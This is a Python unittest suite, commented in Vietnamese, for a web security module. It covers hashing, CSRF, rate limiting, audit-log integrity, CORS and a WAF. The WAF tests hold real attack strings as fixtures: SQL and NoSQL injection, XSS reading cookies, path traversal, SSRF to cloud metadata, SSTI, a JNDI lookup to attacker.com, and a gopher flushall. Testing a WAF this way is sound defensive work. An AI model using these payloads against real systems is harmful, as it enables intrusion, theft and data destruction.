"""
Bộ Kiểm Thử Toàn Diện Module Bảo Mật Web (Web Security Test Suite)
Kiểm thử WAF, Rate Limiting, Auto-Jail, Crypto, CSRF, Sanitizer, Chained Audit.
"""

import unittest
import time
import os
import sys

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
BACKEND_DIR = os.path.dirname(CURRENT_DIR)
WEB_DIR = os.path.dirname(BACKEND_DIR)
PROJECT_DIR = os.path.dirname(WEB_DIR)

for p in [PROJECT_DIR, WEB_DIR]:
    if p not in sys.path:
        sys.path.insert(0, p)

from web.security.crypto import (
    hash_password, verify_password, generate_secure_token,
    sign_data, verify_signed_data, constant_time_compare
)
from web.security.waf import WAFEngine, waf_engine
from web.security.rate_limiter import RateLimiter
from web.security.csrf import CSRFProtector
from web.security.sanitizer import sanitize_input, sanitize_string
from web.security.audit import AuditLogger
from web.security.cors import cors_manager, CORSManager
from web.security.vpn_guard import vpn_guard, VPNNetworkGuard
from web.security.account_lockout import AccountLockoutManager, account_lockout_manager
from web.security.request_guard import RequestGuard, request_guard
from web.security.data_masker import mask_sensitive_data, is_sensitive_key
from web.security.headers import DEFAULT_SECURITY_HEADERS

class TestWebSecuritySuite(unittest.TestCase):

    def test_01_crypto_password_hashing(self):
        pwd = "P@ssw0rd_Super_Secret_2026!"
        hashed = hash_password(pwd)
        self.assertTrue(hashed.startswith("pbkdf2_sha256$600000$"))
        self.assertTrue(verify_password(pwd, hashed))
        self.assertFalse(verify_password("WrongPassword", hashed))
        self.assertFalse(verify_password("", hashed))

    def test_02_crypto_token_and_signing(self):
        token = generate_secure_token(32)
        self.assertEqual(len(token), 64)

        payload = "user_id=123&role=ADMIN"
        signed = sign_data(payload)
        self.assertIn(".", signed)

        verified = verify_signed_data(signed)
        self.assertEqual(verified, payload)

        tampered = signed + "tamper"
        self.assertIsNone(verify_signed_data(tampered))

        self.assertTrue(constant_time_compare("secret123", "secret123"))
        self.assertFalse(constant_time_compare("secret123", "secret456"))

    def test_03_waf_sqli_detection(self):
        waf = WAFEngine()
        payloads = [
            "/api/devices?search=' OR '1'='1",
            "/api/devices?id=1 UNION SELECT null, username, password FROM users",
            "/api/query?name=admin'; DROP TABLE devices;--",
            "/api/login?user=admin&pass=1' OR 1=1--"
        ]
        for p in payloads:
            is_safe, rule, _ = waf.inspect_request(path=p, headers={})
            self.assertFalse(is_safe, f"WAF should block SQLi: {p}")
            self.assertEqual(rule, "SQL_INJECTION")

    def test_04_waf_xss_detection(self):
        waf = WAFEngine()
        payloads = [
            "/index.html?msg=<script>alert('xss')</script>",
            "/search?q=<img src=x onerror=alert(1)>",
            "/page?url=javascript:alert(document.cookie)"
        ]
        for p in payloads:
            is_safe, rule, _ = waf.inspect_request(path=p, headers={})
            self.assertFalse(is_safe, f"WAF should block XSS: {p}")
            self.assertEqual(rule, "XSS_ATTACK")

    def test_05_waf_path_traversal_detection(self):
        waf = WAFEngine()
        payloads = [
            "/downloads/../../etc/passwd",
            "/static/..%2f..%2fwindows/system32/cmd.exe",
            "/files?f=../../../win.ini"
        ]
        for p in payloads:
            is_safe, rule, _ = waf.inspect_request(path=p, headers={})
            self.assertFalse(is_safe, f"WAF should block Path Traversal: {p}")
            self.assertEqual(rule, "PATH_TRAVERSAL")

    def test_06_waf_bad_user_agent(self):
        waf = WAFEngine()
        is_safe, rule, _ = waf.inspect_request(
            path="/api/devices",
            headers={"User-Agent": "sqlmap/1.6.12#stable (https://sqlmap.org)"}
        )
        self.assertFalse(is_safe)
        self.assertEqual(rule, "MALICIOUS_USER_AGENT")

    def test_07_rate_limiter_and_auto_jail(self):
        limiter = RateLimiter(default_limit_per_minute=5, jail_violation_threshold=2, default_jail_duration_seconds=10)
        ip = "192.168.1.99"

        # 5 request đầu tiên thành công
        for _ in range(5):
            allowed, _, _ = limiter.is_allowed(ip)
            self.assertTrue(allowed)

        # Request thứ 6 vượt ngưỡng
        allowed, retry_after, reason = limiter.is_allowed(ip)
        self.assertFalse(allowed)
        self.assertIn("Vượt quá tần suất", reason)

        # Gửi thêm để kích hoạt Auto-Jail
        limiter.record_security_violation(ip, weight=3)
        allowed, jail_time, jail_reason = limiter.is_allowed(ip)
        self.assertFalse(allowed)
        self.assertTrue(any(k in jail_reason.lower() for k in ["tạm khóa", "cách ly"]))

        # Unjail thủ công
        limiter.unjail_ip(ip)
        self.assertNotIn(ip, limiter.get_jailed_ips())

    def test_08_csrf_protector(self):
        csrf = CSRFProtector(token_ttl_seconds=300)
        session_id = "sess_abc123"
        token = csrf.generate_token(session_id)

        # GET request luôn hợp lệ
        ok, _ = csrf.validate_request("GET", session_id, None)
        self.assertTrue(ok)

        # POST request với token đúng
        ok, _ = csrf.validate_request("POST", session_id, token)
        self.assertTrue(ok)

        # POST request với token sai
        ok, err = csrf.validate_request("POST", session_id, "invalid_token")
        self.assertFalse(ok)
        self.assertIn("không hợp lệ", err)

        # POST request thiếu token
        ok, err = csrf.validate_request("POST", session_id, None)
        self.assertFalse(ok)

    def test_09_sanitizer_deep_clean(self):
        dirty = {
            "name": "<b>Safe</b> <script>bad()</script>",
            "__proto__": {"admin": True},
            "nested": {
                "ip": "192.168.1.1\x00extra",
                "list": ["ok", "<img src=x>"]
            }
        }
        cleaned = sanitize_input(dirty)
        self.assertNotIn("__proto__", cleaned)
        self.assertNotIn("\x00", cleaned["nested"]["ip"])
        self.assertIn("&lt;script&gt;", cleaned["name"])
        self.assertIn("&lt;img src=x&gt;", cleaned["nested"]["list"][1])

    def test_10_chained_audit_logger_integrity(self):
        log_dir = os.path.join(WEB_DIR, "logs", "test_audit")
        os.makedirs(log_dir, exist_ok=True)
        audit = AuditLogger(log_dir=log_dir)

        # Xóa file cũ nếu có
        if os.path.exists(audit.log_file):
            os.remove(audit.log_file)

        audit.log_security_event("LOGIN_SUCCESS", "admin", "192.168.1.5", "Admin logged in")
        audit.log_security_event("WAF_BLOCK", "anonymous", "10.0.0.1", "SQLi blocked")
        audit.log_security_event("SETTING_UPDATE", "admin", "192.168.1.5", "Scan interval set to 60s")

        is_valid, count, msg = audit.verify_log_integrity()
        self.assertTrue(is_valid)
        self.assertEqual(count, 3)

        # Thử can thiệp sửa đổi 1 ký tự vào log -> verify_log_integrity phải phát hiện ra
        with open(audit.log_file, "r", encoding="utf-8") as f:
            lines = f.readlines()
        lines[1] = lines[1].replace("10.0.0.1", "10.0.0.2") # Sửa IP
        with open(audit.log_file, "w", encoding="utf-8") as f:
            f.writelines(lines)

        is_valid_tampered, _, tamper_msg = audit.verify_log_integrity()
        self.assertFalse(is_valid_tampered)
        self.assertIn("LỖI TOÀN VẸN", tamper_msg)

        # Dọn dẹp test
        import shutil
        if os.path.exists(log_dir):
            shutil.rmtree(log_dir, ignore_errors=True)

    def test_11_nosql_injection_detection(self):
        waf = WAFEngine()
        payloads = [
            '{"username": "admin", "password": {"$ne": null}}',
            '{"user": {"$gt": ""}}',
            '{"$where": "this.password.length > 5"}',
            'db.users.find({"active": true})'
        ]
        for p in payloads:
            is_safe, rule, _ = waf.inspect_request("/api/v1/auth/login", {}, body=p, method="POST")
            self.assertFalse(is_safe, f"Failed to detect NoSQL payload: {p}")
            self.assertEqual(rule, "NOSQL_INJECTION")

    def test_12_cors_policy_and_origin_validation(self):
        cors = CORSManager(allowed_origins=["http://localhost:8080", "http://127.0.0.1:8080"])

        # Allowed Origins (localhost & private subnets)
        self.assertTrue(cors.is_origin_allowed("http://localhost:8080"))
        self.assertTrue(cors.is_origin_allowed("http://127.0.0.1:8080"))
        self.assertTrue(cors.is_origin_allowed("http://192.168.1.100:8080"))
        self.assertTrue(cors.is_origin_allowed("http://10.8.0.2:3000"))
        self.assertTrue(cors.is_origin_allowed(None)) # Same-Origin

        # Disallowed Origins (External malicious sites)
        self.assertFalse(cors.is_origin_allowed("http://malicious-attacker.com"))
        self.assertFalse(cors.is_origin_allowed("https://phishing-site.org"))

    def test_13_vpn_and_private_network_guard(self):
        guard = VPNNetworkGuard(enforce_vpn_on_admin=True)

        # Private / VPN IPs
        self.assertTrue(guard.is_private_or_vpn("127.0.0.1"))
        self.assertTrue(guard.is_private_or_vpn("192.168.1.1"))
        self.assertTrue(guard.is_private_or_vpn("10.8.0.5"))     # OpenVPN / WireGuard
        self.assertTrue(guard.is_private_or_vpn("100.64.0.1"))   # Tailscale CGNAT
        self.assertEqual(guard.identify_network_type("100.64.0.1"), "VPN_TUNNEL_TAILSCALE")

        # Public WAN IP
        public_ip = "8.8.8.8"
        self.assertFalse(guard.is_private_or_vpn(public_ip))
        self.assertEqual(guard.identify_network_type(public_ip), "PUBLIC_INTERNET_WAN")

        # Admin route blocked from Public WAN without VPN
        allowed, err = guard.validate_route_access(public_ip, "/api/v1/settings")
        self.assertFalse(allowed)
        self.assertIn("VPN", err)

        # Admin route allowed from VPN / LAN
        allowed, err = guard.validate_route_access("10.8.0.5", "/api/v1/settings")
        self.assertTrue(allowed)
        self.assertIsNone(err)

    def test_14_advanced_waf_ssrf_ssti_jndi_and_wrappers(self):
        waf = WAFEngine()

        # 1. SSRF
        is_safe, rule, _ = waf.inspect_request("/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/", {})
        self.assertFalse(is_safe)
        self.assertEqual(rule, "SSRF_ATTACK")

        is_safe, rule, _ = waf.inspect_request("/api/v1/webhook", {}, body='{"target": "http://metadata.google.internal/computeMetadata/v1/"}', method="POST")
        self.assertFalse(is_safe)
        self.assertEqual(rule, "SSRF_ATTACK")

        # 2. SSTI
        is_safe, rule, _ = waf.inspect_request("/search?q={{7*7}}", {})
        self.assertFalse(is_safe)
        self.assertEqual(rule, "SSTI_ATTACK")

        is_safe, rule, _ = waf.inspect_request("/api/v1/profile", {}, body='{"bio": "{{config.items()}}"}', method="POST")
        self.assertFalse(is_safe)
        self.assertEqual(rule, "SSTI_ATTACK")

        # 3. JNDI / Log4j
        is_safe, rule, _ = waf.inspect_request("/api/v1/log", {"User-Agent": "${jndi:ldap://attacker.com/exp}"})
        self.assertFalse(is_safe)
        self.assertEqual(rule, "JNDI_LOG4J_ATTACK")

        # 4. Protocol Wrappers
        is_safe, rule, _ = waf.inspect_request("/api/v1/fetch?file=php://filter/resource=index.php", {})
        self.assertFalse(is_safe)
        self.assertEqual(rule, "PROTOCOL_WRAPPER_ATTACK")

        is_safe, rule, _ = waf.inspect_request("/api/v1/fetch?target=gopher://127.0.0.1:6379/_flushall", {})
        self.assertFalse(is_safe)
        self.assertEqual(rule, "PROTOCOL_WRAPPER_ATTACK")

    def test_15_account_lockout_mechanism(self):
        mgr = AccountLockoutManager(max_attempts=3, lockout_seconds=60)
        user = "admin_test"

        # Ban đầu không bị khóa
        is_l, _ = mgr.is_locked(user)
        self.assertFalse(is_l)

        # 2 lần thất bại -> vẫn chưa khóa
        mgr.record_failure(user)
        is_l, _ = mgr.is_locked(user)
        self.assertFalse(is_l)

        mgr.record_failure(user)
        is_l, _ = mgr.is_locked(user)
        self.assertFalse(is_l)

        # Lần thứ 3 -> bị khóa
        just_locked, remaining_or_sec = mgr.record_failure(user)
        self.assertTrue(just_locked)
        is_l, remaining = mgr.is_locked(user)
        self.assertTrue(is_l)
        self.assertTrue(remaining > 0)

        # Đăng nhập thành công sau khi mở khóa -> xóa lịch sử
        mgr.record_success(user)
        is_l, _ = mgr.is_locked(user)
        self.assertFalse(is_l)

    def test_16_request_guard_limits_and_mime(self):
        guard = RequestGuard(max_body_size=1024)

        # 1. Payload kích thước bình thường
        valid, code, _ = guard.validate_request("POST", "/api/v1/devices", {"Content-Length": "500", "Content-Type": "application/json"})
        self.assertTrue(valid)
        self.assertEqual(code, 200)

        # 2. Payload vượt quá giới hạn (413 Payload Too Large)
        valid, code, msg = guard.validate_request("POST", "/api/v1/devices", {"Content-Length": "2048", "Content-Type": "application/json"})
        self.assertFalse(valid)
        self.assertEqual(code, 413)

        # 3. Content-Type không hợp lệ (415 Unsupported Media Type)
        valid, code, msg = guard.validate_request("POST", "/api/v1/devices", {"Content-Length": "100", "Content-Type": "application/xml"})
        self.assertFalse(valid)
        self.assertEqual(code, 415)

    def test_17_data_masker(self):
        raw_payload = {
            "id": 101,
            "username": "network_admin",
            "password": "ClearTextPassword123!",
            "api_key": "sec_live_998877665544332211",
            "device": {
                "ip": "192.168.1.100",
                "router_secret": "RouterSecretKey999"
            }
        }
        masked = mask_sensitive_data(raw_payload)

        # Dữ liệu thường giữ nguyên
        self.assertEqual(masked["id"], 101)
        self.assertEqual(masked["username"], "network_admin")
        self.assertEqual(masked["device"]["ip"], "192.168.1.100")

        # Dữ liệu nhạy cảm được che dấu bằng ********
        self.assertEqual(masked["password"], "********")
        self.assertEqual(masked["api_key"], "********")
        self.assertEqual(masked["device"]["router_secret"], "********")

    def test_18_enhanced_security_headers(self):
        self.assertIn("Permissions-Policy", DEFAULT_SECURITY_HEADERS)
        self.assertIn("Cross-Origin-Opener-Policy", DEFAULT_SECURITY_HEADERS)
        self.assertIn("Cross-Origin-Resource-Policy", DEFAULT_SECURITY_HEADERS)
        self.assertIn("Cross-Origin-Embedder-Policy", DEFAULT_SECURITY_HEADERS)
        self.assertIn("X-Permitted-Cross-Domain-Policies", DEFAULT_SECURITY_HEADERS)

if __name__ == "__main__":
    unittest.main()

